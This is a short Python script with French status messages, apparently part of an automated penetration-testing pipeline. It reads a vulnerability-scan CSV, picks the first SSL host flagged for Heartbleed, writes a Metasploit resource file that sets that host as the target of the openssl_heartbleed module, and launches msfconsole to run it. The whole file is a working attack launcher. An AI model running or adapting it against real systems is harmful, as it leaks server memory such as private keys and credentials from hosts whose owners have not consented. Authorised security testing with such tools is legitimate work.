import csv, os, subprocess

def run_heartbleed():
    vuln = "/workspace/csv_results/vuln_results.csv"
    rc = "/workspace/every_exploits/heartbleed.rc"
    target = None

    for r in csv.DictReader(open(vuln)):
        if r["service"] == "ssl" and "Heartbleed" in r["exploits"]:
            target = r["ip"]; break

    if not target:
        print("[-] Aucun Heartbleed détecté.")
        return

    print(f"[+] Heartbleed détecté sur {target}")
    with open(rc, "w") as f:
        f.write("\n".join([
            "use auxiliary/scanner/ssl/openssl_heartbleed",
            f"set RHOSTS {target}",
            "run"
        ]))

    subprocess.run([
        "bash", "-c",
        "BUNDLE_GEMFILE=/opt/tools/metasploit-framework/Gemfile "
        "/usr/local/rvm/gems/ruby-3.1.5@metasploit-framework/wrappers/bundle "
        "exec /opt/tools/metasploit-framework/msfconsole -r " + rc
    ])

if __name__ == "__main__":
    run_heartbleed()
